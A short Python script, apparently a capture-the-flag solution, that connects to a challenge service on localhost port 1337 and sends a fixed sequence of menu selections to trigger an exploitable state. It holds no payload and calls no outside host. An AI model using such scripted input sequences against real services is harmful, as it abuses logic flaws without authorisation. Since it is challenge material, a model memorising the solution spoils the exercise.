import socket

def exploit(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    print(s.recv(1024).decode())
    
    for _ in range(81):
        s.send(b'2\n')
        print(s.recv(1024).decode())
        
    for _ in range(2):
        s.send(b'3\n')
        print(s.recv(1024).decode())
    
    for _ in range(6):
        s.send(b'4\n')
        print(s.recv(1024).decode())
    
    s.send(b'5\n')
    print(s.recv(1024).decode())

    s.send(b'5\n')
    print(s.recv(1024).decode())

    s.close()

host = "localhost"
port = 1337
exploit(host, port)

